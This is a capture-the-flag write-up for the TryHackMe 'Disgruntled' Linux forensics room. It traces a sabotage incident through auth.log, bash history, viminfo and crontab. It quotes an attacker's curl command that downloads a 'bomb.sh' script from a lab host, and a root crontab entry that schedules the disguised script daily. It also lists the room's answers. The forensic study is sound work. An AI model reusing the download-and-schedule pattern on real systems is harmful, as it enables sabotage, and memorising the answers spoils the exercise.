---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Disgruntled
# DESCRIPTION       . Use your Linux forensics knowledge to investigate an incident.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/disgruntled
```

> The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

- We can find anything ran as sudo in the `/var/log/auth.log` file(s). 

```
cat /var/log/auth.log | grep -i apt | tail
```

```
{trimmed} sudo:    cybert : TTY=pts/0 ; PWD=/home/cybert; USER=root; COMMAND=/usr/bin/apt install dokuwiki
```

> What was the present working directory (PWD) when the previous command was run?

- Answered in the output of the previous command.

> Which user was created after the package from the previous task was installed?

- Using the same principle as in the first question

```
cat /var/log/auth.log | grep -i adduser | tail
```

```
{trimmed} ; COMMAND = /usr/sbin/adduser it-admin
```

- the user can be found in `/etc/passwd` too.

> A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

```
cat /var/log/auth.log | grep -i visudo | tail
```

- DEC 28 06:27:34

> A script file was opened using the "vi" text editor. What is the name of this file?

```
cat /var/log/auth.log | grep -i vi | tail
```

- bomb.sh

> What is the command used that created the file bomb.sh?

- The command can be found in `/home/it-admin/.bash_history` (because the previous command was run by it-admin)

```
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
```

> The file was renamed and moved to a different directory. What is the full path of this file now?

- This can be found in `/home/it-admin/.viminfo`.

- The file has been saved as `/bin/os-update.sh`.

> When was the file from the previous question last modified? (Format: Month Day HH:MM)

- I've used `stat /bin/os-update.sh`.

- DEC 28 06:29

> What is the name of the file that will get created when the file from the first question executes?

- Can be found in the code of `/bin/os-update.sh`.

- goodbye.txt

> At what time will the malicious file trigger? (Format: HH:MM AM/PM)

- The file was found in `/etc/crontab` with the following entry

```
#m h dom mon dow user command
0  8 *   *    *  root /bin/os-update.sh
```

- This means that the file will execute at `08:00 AM`.

